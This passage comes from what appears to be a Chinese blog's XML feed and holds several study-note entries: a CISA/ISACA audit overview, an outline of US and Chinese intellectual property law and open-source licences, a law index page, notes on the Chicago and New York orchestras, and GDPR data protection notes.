<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>信息系统审计与控制协会 ( ISACA，Information Systems Audit and Control Association)创始于1967年，1969年组建 EDP 审计师协会，ISACA 已成为一个为信息管理、控制、安全和审计专业设定规范的全球性组织。CISA(Certified Information Systems Auditor）信息系统审计认证是由 ISACA 发起，为信息系统审计、控制与安全等专业领域个人提供评估与认证。</p>
<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h4 id="审计-vs-控制"><a href="#审计-vs-控制" class="headerlink" title="审计 vs 控制"></a>审计 vs 控制</h4><h2 id="信息系统审计"><a href="#信息系统审计" class="headerlink" title="信息系统审计"></a>信息系统审计</h2><p>1、信息系统的审计流程<br>2、IT治理和管理<br>3、信息系统的购置、开发和实施<br>4、信息系统的运营和业务恢复能力<br>5、信息资产的保护</p>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><h4 id="可靠性工程-Overview-of-Reliability"><a href="#可靠性工程-Overview-of-Reliability" class="headerlink" title="可靠性工程 | Overview of Reliability"></a><a href="https://riboseyim.github.io/2020/01/02/Engineering-RAMS/" target="_blank" rel="noopener">可靠性工程 | Overview of Reliability</a></h4><ul>
<li>失效分析</li>
<li>可靠性设计</li>
<li>安全性设计</li>
<li>风险评估</li>
</ul>
<h4 id="项目管理-Overview-of-Project-Management"><a href="#项目管理-Overview-of-Project-Management" class="headerlink" title="项目管理 | Overview of Project Management"></a><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></h4><ul>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/" target="_blank" rel="noopener">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/" target="_blank" rel="noopener">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/" target="_blank" rel="noopener">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.com/2019/05/29/Project-Tech-NetworkPlanning/">PM指南:网络计划技术|工具与技术</a></li>
<li><a href="https://riboseyim.com/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>知识产权法 (Intellectual Property Law)</title>
    <url>/2017/07/09/Law-Of-Intellectual-Property/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>什么是知识产权？</li>
<li>美国知识产权法（计算机软件）</li>
<li>商业秘密</li>
<li>版权</li>
<li>专利</li>
<li>如何选择开源许可证</li>
<li>关于机器学习模型或训练数据的产权保护</li>
<li>世界各国专利分布<a id="more"></a>
</li>
</ul>
<h2 id="什么是知识产权？"><a href="#什么是知识产权？" class="headerlink" title="什么是知识产权？"></a>什么是知识产权？</h2><blockquote>
<p>了解知识产权保护的关键是要理解我们要保护的东西是无形的创造性工作，而不是它的具体物理形态。（《火的礼物》）</p>
<p>知识和艺术作品的价值来自创意、想法、科研、技能、劳动，以及它们的创作者所提供的其他非物质的努力和属性。我们对所创建或购买的物理财产拥有财产权，这包括它的使用权，防止其他人使用，以及设定价格来销售它的权利。如果其他人可以随便把它们拿走，那么我们将不愿意付出努力来购买或生产这些物品。……保护知识产权对个人和社会都有好处：通过保护艺术家、作家和发明家的权利，可以补充他们的创造努力，而通过这样做，也会鼓励生产有价值的、无形的、容易被复制的创造性工作。（《火的礼物》P177）</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Law-of-IP-EU-2015.png" alt></p>
<h2 id="美国知识产权法"><a href="#美国知识产权法" class="headerlink" title="美国知识产权法"></a>美国知识产权法</h2><h4 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h4><ul>
<li>1789 年《宪法》第一章第 8 款：国会应有权……促进科学和实用艺术的进步，确保有限时报作者和发明者的独家权利，以及他们各自的著作和发现。</li>
<li>1790年4月10日，美国第一部版权法。保护范围：图书、地图和图表，之后扩展到摄影、录音和电影。（大清国乾隆五十五年，同年本杰明·富兰克林&amp;亚当·斯密逝世）</li>
<li>1909年版权法案。未经授权的复制的定义必须是从视觉上可以看到或阅读的一种形式（音乐卷片、ROM芯片上下象棋的游戏等都不在保护之列）。</li>
<li>1976年和1980年，版权法修改，使之涵盖了计算机软件。</li>
</ul>
<p>关于知识产权制度，从诞生的那一天起实际上就存在支持/反对两大阵营。黑客大多坚定地站在反对派阵营，或者说黑客群体是反对知识产权制度中最重要的一支力量。黑客反对知识产权制度的观点中，<strong>最重要的一条是保护人的“思想自由”</strong>。黑客（Hacker）群体在许多方面都表现出强烈的精英意识和自觉。例如，他们坚定地认为，知识产权制度无益于增加公众福利。不仅破坏思想自由权利，而且有加强极权主义制度的巨大危险。他们坚信，保护人的思想自由，就是保护国家持续发展根本动力，只有获得独步天下的技术优势，才有可能增加公众福利，反之，则是非常危险的。</p>
<blockquote>
<p>对于版权和专利这样的制度，黑客深感担忧。他们感到，保护“知识产权”的力度不断增大，已经威胁到了他们完成工作所必需的“思想自由”。立法者的愿意可能是好的。但是，他们也许没有意识到，这样的法律弊大于利。(《黑客与画家》（Hackers &amp; Painters），Paul Graham)</p>
</blockquote>
<hr>

<blockquote>
<p>在我看来，一个人们拥有言论自由和行动自由的社会，往往最有可能采纳最优方案，而不是采纳最有权势的人提出的方案。专制国家会变成腐败国家，腐败国家会变成贫穷国家，贫穷国家会变成弱小国家。…. 极权主义制度只要形成了，就很难废除。黑客对于公民自由是非常敏感的，因为这对他们至关重要。他们远远地就能感到极权主义的威胁，好比动物能够感知即将来临的暴风雨。(《黑客与画家》（Hackers &amp; Painters），Paul Graham)</p>
</blockquote>
<h2 id="美国知识产权法（计算机软件）"><a href="#美国知识产权法（计算机软件）" class="headerlink" title="美国知识产权法（计算机软件）"></a>美国知识产权法（计算机软件）</h2><h3 id="商业秘密保护"><a href="#商业秘密保护" class="headerlink" title="商业秘密保护"></a>商业秘密保护</h3><h4 id="计算机软件商业秘密经典案例"><a href="#计算机软件商业秘密经典案例" class="headerlink" title="计算机软件商业秘密经典案例"></a>计算机软件商业秘密经典案例</h4><ul>
<li>数据总公司案</li>
<li>雷克斯案</li>
</ul>
<h3 id="版权保护"><a href="#版权保护" class="headerlink" title="版权保护"></a>版权保护</h3><p>美国版权法（美国法典第17篇）</p>
<h4 id="电子游戏"><a href="#电子游戏" class="headerlink" title="电子游戏"></a>电子游戏</h4><h4 id="使用者界面"><a href="#使用者界面" class="headerlink" title="使用者界面"></a>使用者界面</h4><h4 id="计算机软件版权经典案例"><a href="#计算机软件版权经典案例" class="headerlink" title="计算机软件版权经典案例"></a>计算机软件版权经典案例</h4><h3 id="专利保护"><a href="#专利保护" class="headerlink" title="专利保护"></a>专利保护</h3><h4 id="软件专利的实质性要件"><a href="#软件专利的实质性要件" class="headerlink" title="软件专利的实质性要件"></a>软件专利的实质性要件</h4><ul>
<li>新颖性</li>
<li>非显而易见性</li>
<li>充分披露与最佳方案</li>
</ul>
<h4 id="计算机软件专利经典案例"><a href="#计算机软件专利经典案例" class="headerlink" title="计算机软件专利经典案例"></a>计算机软件专利经典案例</h4><ul>
<li>亚马逊案</li>
<li>王氏实验室案</li>
<li>不列颠通讯公司案</li>
</ul>
<h2 id="专利数据库"><a href="#专利数据库" class="headerlink" title="专利数据库"></a>专利数据库</h2><h4 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h4><ul>
<li>Google 专利数据库：<a href="https://www.google.com/patents" target="_blank" rel="noopener">https://www.google.com/patents</a></li>
</ul>
<h4 id="中国国家知识产权局"><a href="#中国国家知识产权局" class="headerlink" title="中国国家知识产权局"></a>中国国家知识产权局</h4><ul>
<li><a href="http://www.sipo.gov.cn/" target="_blank" rel="noopener">中国国家知识产权局</a></li>
<li><p><a href="http://www.pss-system.gov.cn/" target="_blank" rel="noopener">中国国家知识产权局检索</a></p>
</li>
<li><p>检索功能：常规检索、表格检索、药物专题检索、检索历史、检索结果浏览、文献浏览、批量下载等。</p>
</li>
<li>分析功能：快速分析、定制分析、高级分析、生成分析报告等。</li>
<li>数据范围：收录了103个国家、地区和组织的专利数据，以及引文、同族、法律状态等数据信息，其中涵盖了中国、美国、日本、韩国、英国、法国、德国、瑞士、俄罗斯、欧洲专利局和世界知识产权组织等。</li>
<li>数据更新：中外专利数据，每周三；同族、法律状态数据，每周二；引文数据，每月更新。</li>
</ul>
<h4 id="美国专利和商标局（USPTO）"><a href="#美国专利和商标局（USPTO）" class="headerlink" title="美国专利和商标局（USPTO）"></a>美国专利和商标局（USPTO）</h4><p>在美国，专利由美国专利和商标局（USPTO）授予或颁发,其官方网站可以下载自1976年以来的所有专利文件。</p>
<ul>
<li><a href="www.uspto.gov">美国专利局官方网站：www.uspto.gov</a></li>
</ul>
<h4 id="欧洲专利局（EPO）"><a href="#欧洲专利局（EPO）" class="headerlink" title="欧洲专利局（EPO）"></a>欧洲专利局（EPO）</h4><p>欧洲专利局（European Patent Office，简称 EPO）是根据《欧洲专利公约》（EPC）成立的政府间组织，其主要职能是负责欧洲专利申请的审查、批准及欧洲专利授权公告后异议的审理以及文献出版工作。1973 年欧洲16个国家签订了《欧洲专利公约》，该公约于 1978 年正式生效，这标志着欧洲建立了从申请到授权一体化的专利制度。目前，欧洲专利局成员国已达 38 个，其授权专利在 40 个欧洲国家生效（包括 38 个缔约国和 4 个延伸国）。</p>
<ul>
<li><a href="http://www.epo.org" target="_blank" rel="noopener">欧洲专利局</a></li>
<li><a href="https://worldwide.espacenet.com/?locale=cn_EP" target="_blank" rel="noopener">欧洲专利局：https://worldwide.espacenet.com/?locale=cn_EP</a></li>
</ul>
<h4 id="世界知识产权组织"><a href="#世界知识产权组织" class="headerlink" title="世界知识产权组织"></a>世界知识产权组织</h4><ul>
<li><a href="http://www.wipo.int/portal/en" target="_blank" rel="noopener">世界知识产权组织</a></li>
</ul>
<h2 id="开源软件"><a href="#开源软件" class="headerlink" title="开源软件"></a>开源软件</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/Software-license-classification.png" alt></p>
<h4 id="右翼阵营（“copyright”）"><a href="#右翼阵营（“copyright”）" class="headerlink" title="右翼阵营（“copyright”）"></a>右翼阵营（“copyright”）</h4><p>代表为著作权 ，从不授予用户任何权利（除了使用的权利），更多的是限制性规定，例如复制、修改、分发等，也可以包括一些法律允许的行为，比如逆向工程。</p>
<h4 id="左翼阵营（“copyleft”）"><a href="#左翼阵营（“copyleft”）" class="headerlink" title="左翼阵营（“copyleft”）"></a>左翼阵营（“copyleft”）</h4><p>代表为 GPL 许可证( GNU 通用公共许可协议,GNU General Public License，简称 GNU GPL、GPL，港台地区翻译为“GNU通用公共授权条款”）是广泛使用的免费软件许可证，最初由GNU项目的自由软件基金会（FSF）的理查德·斯托曼（Richard Matthew Stallman）撰写。 GPL 授予被许可人以下权利（或称“自由”）：</p>
<ul>
<li>以任何目的运行此程序的自由；</li>
<li>再复制的自由；</li>
<li>修改程序并公开发布改进版的自由（前提是能得到源代码）。</li>
</ul>
<p>GPL 及其它 Copyleft 协议授予了被许可人（几乎是任何人）以非常广泛的自由，同时利用版权法设计了“传染机制”：GPL明确规定，任何源码的衍生产品，如果对外发布，都必须保持同样的许可证。这就是说，任何人只要发布基于某个GPL软件的修改版本，他就必须公开源码，并且同意他人可以自由地复制和分发，否则原始作者可以根据版权法起诉 。</p>
<h4 id="中间阵营（copycenter，中间版权）"><a href="#中间阵营（copycenter，中间版权）" class="headerlink" title="中间阵营（copycenter，中间版权）"></a>中间阵营（copycenter，中间版权）</h4><p>代表为 BSD 许可证（Berkeley Software Distribution license）。跟其他许可证相比，BSD许可证比较宽松，跟公有领域更为接近，BSD 许可证被认为是介乎 copyright 与 copyleft之间 。</p>
<blockquote>
<p>“Take it down to the copy center and make as many copies as you want”。</p>
</blockquote>
<p>可以说，GPL强迫后续版本必须一样是自由软件，BSD 的后续版本可以选择要继续是 BSD 或其他自由软件条款或封闭软件等等。</p>
<h2 id="判例"><a href="#判例" class="headerlink" title="判例"></a>判例</h2><h4 id="著作权"><a href="#著作权" class="headerlink" title="著作权"></a>著作权</h4><ul>
<li><a href="http://wenshu.court.gov.cn/content/content?DocID=ae8a516f-fbf7-4f66-82f6-830900b58b8d" target="_blank" rel="noopener">裁判文书网：北京中青文文化传媒有限公司与北京百度网讯科技有限公司侵害作品信息网络传播权纠纷申请再审民事裁定书</a></li>
</ul>
<h4 id="人工智能"><a href="#人工智能" class="headerlink" title="人工智能"></a>人工智能</h4><ul>
<li><a href="http://wenshu.court.gov.cn/content/content?DocID=9680dfb7-d63b-423b-ba86-67231f6d4477" target="_blank" rel="noopener">上海智臻智能网络科技股份有限公司、苹果电脑贸易（上海）有限公司与国家知识产权局专利复审委员会再审行政裁定书</a></li>
</ul>
<h4 id="诈骗类"><a href="#诈骗类" class="headerlink" title="诈骗类"></a>诈骗类</h4><ul>
<li><a href="http://wenshu.court.gov.cn/content/content?DocID=c3b79c11-b963-4231-8c44-38dc2d2b8e5a&amp;KeyWord=长中民再终字第00087号" target="_blank" rel="noopener">湖南领创智能科技有限公司与田凯文民间借贷纠纷再审民事裁定书</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/09/CyberSecurity-Hacker/" target="_blank" rel="noopener">Cyber-Security: 黑客与技术、产业及其精神世界</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/DTrace-Linux/" target="_blank" rel="noopener">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/" target="_blank" rel="noopener">（构思中）人工智能领域法律研究</a></li>
<li><a href="https://www.google.com/?tbm=pts&amp;hl=zh-CN" target="_blank" rel="noopener">（构思中）基于专利文档的信息检索</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li>《美国知识产权法》，李明德</li>
<li>《火的礼物-人类与计算技术的终极博弈（第4版）》，Sara Baase（莎拉芭氏）</li>
<li><a href="http://www.sipo.gov.cn/wxfw/zlwxxxggfw/hlwzljsxt/hlwzljsxtsyzn/201507/P020150710566558198133.pdf" target="_blank" rel="noopener">欧洲专利局手册|包含EPO收录的世界各国专利文献统计数据</a></li>
<li><a href="https://my.oschina.net/xuxueli/blog/918201" target="_blank" rel="noopener">案例：知名公司（努比亚/中兴）拿我的开源软件（ XXL-JOB）申请国家知识专利</a></li>
<li><a href="#">Google和Oracle关于Java的版权官司等</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2011/05/how_to_choose_free_software_licenses.html" target="_blank" rel="noopener">如何选择开源许可证 | 阮一峰,2011-05</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2010/02/why_gpl_is_a_better_choice.html" target="_blank" rel="noopener">为什么GPL是更好的开源许可证? | 阮一峰,2010-02</a></li>
<li><a href="https://zh.wikipedia.org/wiki/Copyleft" target="_blank" rel="noopener">维基百科：Copyleft</a></li>
<li><a href="http://songshuhui.net/archives/100463" target="_blank" rel="noopener">学术界的“盗版女王”</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/35093399" target="_blank" rel="noopener">取消版权保护与战后美国的科学进步 | 量化历史研究</a></li>
<li><a href="https://program-think.blogspot.com/2019/03/Misunderstand-Free-and-Open-Source-Software.html" target="_blank" rel="noopener">澄清“自由软件、开源软件”相关概念及许可证的误解</a></li>
<li><a href="https://opensource.com/article/19/1/open-source-license-scenarios" target="_blank" rel="noopener">4 confusing open source license scenarios and how to navigate them</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Economist</tag>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title>法律 | Overview of Law</title>
    <url>/2016/04/26/Law/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>promote the general welfare</p>
<ul>
<li><a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/" target="_blank" rel="noopener">专题：网络安全法（Cyber-Security）</a></li>
<li><a href="https://riboseyim.github.io/2017/07/09/Law-Of-Intellectual-Property/" target="_blank" rel="noopener">专题：知识产权法（Intellectual Property）</a></li>
</ul>
</blockquote>
<a id="more"></a>
<h2 id="专题：网络安全法（Cyber-Security）"><a href="#专题：网络安全法（Cyber-Security）" class="headerlink" title="专题：网络安全法（Cyber-Security）"></a><a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/" target="_blank" rel="noopener">专题：网络安全法（Cyber-Security）</a></h2><ul>
<li><a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/" target="_blank" rel="noopener">美国网络安全立法策略</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/" target="_blank" rel="noopener">香港警务处网络安全与科技罪案调查科</a></li>
<li><a href="https://riboseyim.github.io/2019/12/08/Law-of-PDO/" target="_blank" rel="noopener">数据与隐私保护法 (Data Protection Law)</a></li>
</ul>
<h2 id="专题：知识产权法（Intellectual-Property）"><a href="#专题：知识产权法（Intellectual-Property）" class="headerlink" title="专题：知识产权法（Intellectual Property）"></a><a href="https://riboseyim.github.io/2017/07/09/Law-Of-Intellectual-Property/" target="_blank" rel="noopener">专题：知识产权法（Intellectual Property）</a></h2><ul>
<li>美国知识产权法</li>
<li>中国计算机软件领域发明专利保护实务</li>
</ul>
<h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ul>
<li><a href="http://wenshu.court.gov.cn/" target="_blank" rel="noopener">中国：裁判文书网</a></li>
</ul>
<h2 id="社区"><a href="#社区" class="headerlink" title="社区"></a>社区</h2><h4 id="简书专题《Policy-amp-Law》"><a href="#简书专题《Policy-amp-Law》" class="headerlink" title="简书专题《Policy&amp;Law》"></a><a href="http://www.jianshu.com/collection/429d6d677988" target="_blank" rel="noopener">简书专题《Policy&amp;Law》</a></h4><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/Eh2hVuOLPU-mZXLvoxuC8Q" target="_blank" rel="noopener">揭开《哈佛法律评论》的面纱|2017-05-19 方流芳 雅理读书</a></li>
<li><a href="http://wemedia.ifeng.com/9016353/wemedia.shtml" target="_blank" rel="noopener">有什么样的法学院，就有什么样的法院 | 清华大学法学院（国际化经验）</a></li>
<li><a href="https://mp.weixin.qq.com/s/r3os6aU3O7t6O3PvXKftvQ" target="_blank" rel="noopener">学术| 赵晓耕 时晨: 明代厂卫与法司的平衡与牵制 | 甘肃社会科学  法学学术前沿  1月10日</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title>Lincoln-Chicago-Orchestra</title>
    <url>/2018/03/30/Lincoln-Chicago-Orchestra/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<blockquote>
<p>芝加哥交响乐团（穆蒂的新东家）的特点是有力量，以机床般强劲的铜管乐器为核心，这主要是由指挥弗里茨·莱纳(Fritz Reiner)带动起来的，后被格奥尔格·佐尔蒂(Georg Solti)进行了略带夸张的演绎；波士顿交响乐团的特点是稍微有点狂热，具有穿透力，很适合它演奏的法国音乐，指挥是查尔斯·明希(Charles Munch)和皮埃尔·蒙度(Pierre Monteux)；伦纳德·伯恩斯坦(Leonard Bernstein)领导下的纽约爱乐乐团的特点是态度轻松、随意。—— 《纽约时报》</p>
</blockquote>
<h4 id="Chicago-Symphony-Orchestra-芝加哥交响乐团"><a href="#Chicago-Symphony-Orchestra-芝加哥交响乐团" class="headerlink" title="Chicago Symphony Orchestra | 芝加哥交响乐团"></a>Chicago Symphony Orchestra | 芝加哥交响乐团</h4><p>官方网站: www.cso.org<br>芝加哥交响乐团（Chicago Symphony Orchestra，CSO ）成立于 1891 年，美国五大管弦乐团之一。<br>艺术风格：芝加哥交响乐团曲目广泛，演奏稳重扎实，音响坚实有力。</p>
<p>重要指挥家：</p>
<ul>
<li>西奥多·托马斯（Theodore Thomas），乐团创办人</li>
<li>弗雷德里克·施托克（Frederick Stock） ，1905年托马斯去世后任音乐总监和指挥，达37年之久。施托克出生于德国，他使乐团具有德国音乐传统。</li>
<li>弗里茨·莱纳（Fritz Reiner ，匈牙利人，1922年入美国籍），1953—1963年任芝加哥交响乐团常任指挥，期间强化乐队训练，乐团留下了许多一流的录音唱片。代表作品包括理查·斯特劳斯（查拉图斯特拉如是说）及巴托克、贝多芬作品。</li>
<li>格奥尔格·佐尔蒂(Georg Solti)，1969年就任音乐总监与指挥，演奏水平日益提高，迎来了乐团的黄金时代，成为世界第一流交响乐团。</li>
</ul>
<h4 id="New-York-Philharmonic-纽约爱乐乐团"><a href="#New-York-Philharmonic-纽约爱乐乐团" class="headerlink" title="New York Philharmonic | 纽约爱乐乐团"></a>New York Philharmonic | 纽约爱乐乐团</h4><p>纽约爱乐（New York Philharmonic），正式全名为纽约爱乐交响乐协会（Philharmonic-Symphony Society of New York, Inc.），世界上历史最悠久的乐队之一， 1842 年在美国纽约市成立。纽约爱乐是美国成立时间最长的乐团，属于美国五大管弦乐团之一。纽约爱乐完成过多个音乐作品的美国首演，例如贝多芬的《第九交响曲》。纽约爱乐目前一年大约演出 180 场音乐会。</p>
<p>重要指挥家：</p>
<ul>
<li>伦纳德·伯恩斯坦(Leonard Bernstein)</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://zh.wikipedia.org/wiki/%E7%AE%A1%E5%BC%A6%E4%B9%90%E5%9B%A2%E5%88%97%E8%A1%A8" target="_blank" rel="noopener">维基百科：芝加哥交响乐团</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E7%AE%A1%E5%BC%A6%E4%B9%90%E5%9B%A2%E5%88%97%E8%A1%A8" target="_blank" rel="noopener">维基百科：管弦乐团列表</a></li>
</ul>
]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>Artistic</tag>
      </tags>
  </entry>
  <entry>
    <title>数据与隐私保护法 (Data Protection rules Law)</title>
    <url>/2019/12/08/Law-of-PDO/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Personal data breach  数据泄露</li>
</ul>
<a id="more"></a>
<h2 id="主要概念"><a href="#主要概念" class="headerlink" title="主要概念"></a>主要概念</h2><h4 id="GDPR"><a href="#GDPR" class="headerlink" title="GDPR"></a>GDPR</h4><h4 id="EEA"><a href="#EEA" class="headerlink" title="EEA"></a>EEA</h4><h4 id="Roles"><a href="#Roles" class="headerlink" title="Roles"></a>Roles</h4><ul>
<li>Data subject  数据主体   1、可识别自然人 2、特殊条款： 儿童：不满16岁周岁、最低不低于13岁</li>
<li>Controller 数据控制者</li>
<li>Processor 数据处理者</li>
<li>DPO（Data Protection Officer）数据保护官。<br>  具有数据保护法律和实践的专家；直接向最高管理层报告，应具有独立性；任命后公布其信息，通知监督机构。</li>
<li>Representative 代理方。例如聘请的专业领域的律师</li>
<li>Recipient 接收者</li>
<li>Supervisory authority 监管机构</li>
<li>Third party 第三方 。</li>
</ul>
<h4 id="个人数据"><a href="#个人数据" class="headerlink" title="个人数据"></a>个人数据</h4><p>Types of personal data</p>
<ul>
<li>Direct 直接：照片、DNA</li>
<li>Indirect 间接：IP地址、车牌</li>
<li>Pseudonymized（假名化）化名（假名）：</li>
<li>匿名化：不能确定与数据有关的主体是谁。不再被认为是个人数据</li>
</ul>
<h4 id="个人数据的特殊类别（敏感数据）-Sensitive-data"><a href="#个人数据的特殊类别（敏感数据）-Sensitive-data" class="headerlink" title="个人数据的特殊类别（敏感数据） Sensitive data"></a>个人数据的特殊类别（敏感数据） Sensitive data</h4><p>特定类别的个人数据禁止处理</p>
<ul>
<li>种族出身</li>
<li>政治观点</li>
<li>宗教、哲学信仰、工会会员身份</li>
<li>基因数据</li>
<li>用于唯一识别自然人的目的生物特征数据  </li>
<li>有关健康的数据</li>
<li>有关自然人的性生活或性取向的数据</li>
</ul>
<p>GDPR特例：</p>
<ul>
<li>个人肖像画不是个人数据</li>
<li>信用卡账单信息</li>
</ul>
<p>GDPR 的基本原则是：敏感数据不允许处理，除了立法中的例外规定，如医疗等（第9条）</p>
<h4 id="数据主体"><a href="#数据主体" class="headerlink" title="数据主体"></a>数据主体</h4><p>The data subject’s right</p>
<ul>
<li>right to access</li>
<li>right to rectification</li>
</ul>
<p>数据主体应有对于信息的以下权利：</p>
<ul>
<li>可获取。</li>
<li>可反对。例如数据主体有权反对自动化个人决策——包括用户画像</li>
<li>可撤销。撤回同意</li>
<li>可限制。要求限制个人数据的处理行为</li>
<li>可纠正。修改不准确的个人数据，将不完整的数据补充完整</li>
<li>可携带。数据主体可以将数据转移给其它控制者。例如病历数据</li>
<li>可擦除。被遗忘的权力</li>
<li>可申诉和申请法律救济</li>
</ul>
<h2 id="数据处理的合法理由"><a href="#数据处理的合法理由" class="headerlink" title="数据处理的合法理由"></a>数据处理的合法理由</h2><h4 id="同意与撤销同意"><a href="#同意与撤销同意" class="headerlink" title="同意与撤销同意"></a>同意与撤销同意</h4><p><strong>同意</strong>：应当以一种容易理解的形式，使用清晰和平白的语言。</p>
<p><strong>撤销同意</strong>：</p>
<h2 id="Personal-data-breach-数据泄露"><a href="#Personal-data-breach-数据泄露" class="headerlink" title="Personal data breach  数据泄露"></a>Personal data breach  数据泄露</h2><p>意外或非法地销毁、遗失、更改、未经授权披露或查阅传送、存储或以其他方式处理的个人数据。</p>
<ul>
<li>物质的：数据载体丢失，文件夹丢失，手机丢失</li>
<li>口头的：失言、故意泄露 网络的:后门、黑客、代码错误</li>
</ul>
<h4 id="五大数据泄露漏洞"><a href="#五大数据泄露漏洞" class="headerlink" title="五大数据泄露漏洞"></a>五大数据泄露漏洞</h4><ul>
<li>雇员</li>
<li>移动设备</li>
<li>云存储</li>
<li>第三方服务提供商</li>
<li>恶意攻击</li>
</ul>
<h2 id="数据暴露（Data-exposure）"><a href="#数据暴露（Data-exposure）" class="headerlink" title="数据暴露（Data exposure）"></a>数据暴露（Data exposure）</h2><p>定义：因存储和保护不当而暴露在互联网</p>
<p>个人数据泄露<br>通知流程：判断，补救，通知</p>
<p>相关服务：Identity Guard 信用监控和身份盗窃服务</p>
<p>控制者与处理者的责任与义务<br>控制者：技术和组织措施以遵守ＧＤＰＲ<br>处理者：遵守控制者的指令</p>
<h2 id="基于设计和默认的数据保护"><a href="#基于设计和默认的数据保护" class="headerlink" title="基于设计和默认的数据保护"></a>基于设计和默认的数据保护</h2><p>设计：<br>默认：业务开展、系统数据－＞企业文化</p>
<h2 id="监管手段"><a href="#监管手段" class="headerlink" title="监管手段"></a>监管手段</h2><h4 id="行政罚款"><a href="#行政罚款" class="headerlink" title="行政罚款"></a>行政罚款</h4><ul>
<li>一般违规：１０００万欧元或全球营业额２％中的高者</li>
<li>严重罚款：２０００万欧元或全球营业额４％中的高者</li>
</ul>
<p>严重罚则：违反基本原则，例如“同意”；转移第三国</p>
<p>GDPR第58条赋予监管机构以下权力：</p>
<ul>
<li>调查权</li>
<li>纠正权</li>
<li>授权和提供咨询的权力</li>
</ul>
<p>监管机构的权力和责任</p>
<ul>
<li>推动</li>
<li>咨询</li>
<li>违规</li>
<li>标准</li>
</ul>
<p>针对监管机构的原则：技术中立</p>
<h2 id="跨境传输：EEA"><a href="#跨境传输：EEA" class="headerlink" title="跨境传输：EEA"></a>跨境传输：EEA</h2><p>EEA内的数据传输<br>EEA以外的数据传输（第三国=EEA以外的国家）</p>
<p>欧共体EC充分性认定：<br>安道尔、阿根廷、加拿大、日本<br>以色列、新西兰、瑞士、乌拉圭</p>
<p>欧盟-美国隐私盾协议</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2019/12/08/Law-of-PDO/" target="_blank" rel="noopener">数据与隐私保护法 (Data Protection Law)</a></li>
</ul>
<h2 id="参考书"><a href="#参考书" class="headerlink" title="参考书"></a>参考书</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
